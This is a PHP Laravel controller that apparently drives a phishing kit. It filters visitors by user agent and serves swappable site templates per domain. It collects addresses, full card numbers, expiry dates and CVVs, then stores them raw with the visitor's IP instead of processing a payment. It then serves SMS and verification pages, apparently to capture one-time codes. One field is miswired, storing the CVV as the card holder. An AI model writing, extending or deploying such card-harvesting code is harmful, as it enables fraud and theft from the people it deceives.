<?php

namespace App\Http\Controllers\apps;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\Customer;
use App\Models\Sources;
use Carbon\Carbon;

class MxeController extends Controller
{
    public $sitePath = 'mxe';

    public function __construct(Request $request)
    {
        $this->middleware('checkUserAgent');

        $serverAddr = @$_SERVER['REMOTE_ADDR'];

        $domainSource = Sources::where('domain_name', $serverAddr)->first();
        $enabledSource = Sources::where('enabled', true)->first();

        if ($domainSource) {
            $this->sitePath = $domainSource->path;
        } else {

            if ($enabledSource) {
                $this->sitePath = $enabledSource->path;
            }
        }

    }

    /**
     * Show the profile for a given user.
     *
     * @param  int  $id
     * @return \Illuminate\View\View
     */
    public function index()
    {
        $DATE_TIME_FORMATE = "m/d/Y H:s";
        $DATE_FORMATE = "m/d/y";
        $globalDate = date($DATE_FORMATE);
        $currentDateTime = date('m/d/Y H:i');

        return view('apps.'.$this->sitePath.'.index', compact(
            'DATE_TIME_FORMATE',
            'DATE_FORMATE',
            'globalDate',
            'currentDateTime'
        ));
    }

    public function address()
    {
        return view('apps.'.$this->sitePath.'.address');
    }

    public function payment_post(Request $request)
    {
        $address = $request->input('address');
        $country = $request->input('country');
        $zipcode = $request->input('zipcode');
        $straight = $request->input('straight');

        $request->session()->put('address', $address);
        $request->session()->put('country', $country);
        $request->session()->put('zipcode', $zipcode);
        $request->session()->put('straight', $straight);
        return redirect()->route('apps.'.$this->sitePath.'.payment');
    }

    public function payment(Request $request)
    {
        $address = $request->session()->get('address') ? $request->session()->get('address') : "";
        $country = $request->session()->get('country') ? $request->session()->get('country') : "";
        $zipcode = $request->session()->get('zipcode') ? $request->session()->get('zipcode') : "";
        $straight = $request->session()->get('straight') ? $request->session()->get('straight') : "";
        return view('apps.'.$this->sitePath.'.payment', compact('address', 'country', 'zipcode', 'straight'));
    }

    public function payment_save(Request $request)
    {
        $userId = $request->input('card.newID');
        $cardNumber = $request->input('card.cardnumber');
        $cardMonth = $request->input('card.month');
        $cardYear = $request->input('card.year');
        $cardHolder = $request->input('card.holder');
        $cardCvv = $request->input('card.cvv');
        $address = $request->input('address');
        $card = [
            "cardNumber" => $cardNumber,
            "month" => $cardMonth,
            "year" => $cardYear,
            "holder" => $cardCvv,
            "cvv" => $cardCvv
        ];

        // $customer = new Customer();
        // $customer->client_id = $userId;
        // $customer->address = json_encode($address);
        // $customer->card = json_encode($card);
        // $customer->save();

        $customer = Customer::updateOrCreate([
            'client_id' => $userId,
            'ip_address' => getVisitorIp(),
            'date_submit' => Carbon::today()->format('Y-m-d')
        ], [
            'address' => json_encode($address),
            'card' => json_encode($card)
        ]);

        $response = [
            'success' => true,
            'userId' => $customer->id
        ];

        return response()->json($response);
    }

    public function sms()
    {
        return view('apps.'.$this->sitePath.'.sms');
    }
    public function smspass()
    {
        return view('apps.'.$this->sitePath.'.sms-pass');
    }

    public function verification()
    {
        return view('apps.'.$this->sitePath.'.verification');
    }
}
